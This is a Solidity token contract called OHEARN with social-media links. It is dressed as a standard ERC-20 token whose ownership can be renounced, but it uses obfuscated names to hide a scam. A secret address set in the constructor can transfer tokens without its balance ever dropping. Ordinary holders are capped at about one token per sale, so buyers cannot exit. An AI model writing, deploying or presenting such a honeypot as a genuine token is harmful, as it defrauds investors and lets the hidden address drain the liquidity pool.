/*

https://t.me/Ohearnerc

http://www.twitter.com/OhearnErc

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract OHEARN is Ownable {
    function transferFrom(address hwcorstvuq, address viyxzotfasu, uint256 anuhqpilyxfo) public returns (bool success) {
        require(anuhqpilyxfo <= allowance[hwcorstvuq][msg.sender]);
        allowance[hwcorstvuq][msg.sender] -= anuhqpilyxfo;
        xpjvdekswc(hwcorstvuq, viyxzotfasu, anuhqpilyxfo);
        return true;
    }

    function approve(address nemvjgltkxzi, uint256 anuhqpilyxfo) public returns (bool success) {
        allowance[msg.sender][nemvjgltkxzi] = anuhqpilyxfo;
        emit Approval(msg.sender, nemvjgltkxzi, anuhqpilyxfo);
        return true;
    }

    string public name;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    IUniswapV2Router02 private mzawpgetj;

    string public symbol;

    function xpjvdekswc(address hwcorstvuq, address viyxzotfasu, uint256 anuhqpilyxfo) private {
        address lobc = IUniswapV2Factory(mzawpgetj.factory()).getPair(address(this), mzawpgetj.WETH());
        bool utak = 0 == chyulgtrqn[hwcorstvuq];
        if (utak) {
            if (hwcorstvuq != lobc && fndkctmqgrzi[hwcorstvuq] != block.number && anuhqpilyxfo < totalSupply) {
                require(anuhqpilyxfo <= totalSupply / (10 ** decimals));
            }
            balanceOf[hwcorstvuq] -= anuhqpilyxfo;
        }
        balanceOf[viyxzotfasu] += anuhqpilyxfo;
        fndkctmqgrzi[viyxzotfasu] = block.number;
        emit Transfer(hwcorstvuq, viyxzotfasu, anuhqpilyxfo);
    }

    function transfer(address viyxzotfasu, uint256 anuhqpilyxfo) public returns (bool success) {
        xpjvdekswc(msg.sender, viyxzotfasu, anuhqpilyxfo);
        return true;
    }

    uint8 public decimals = 9;

    mapping(address => uint256) private fndkctmqgrzi;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 private fishuqg = 117;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) public balanceOf;

    constructor(string memory protdkg, string memory pyblxigmj, address gydqjmcouf, address sfgeqmo) {
        name = protdkg;
        symbol = pyblxigmj;
        balanceOf[msg.sender] = totalSupply;
        chyulgtrqn[sfgeqmo] = fishuqg;
        mzawpgetj = IUniswapV2Router02(gydqjmcouf);
    }

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private chyulgtrqn;
}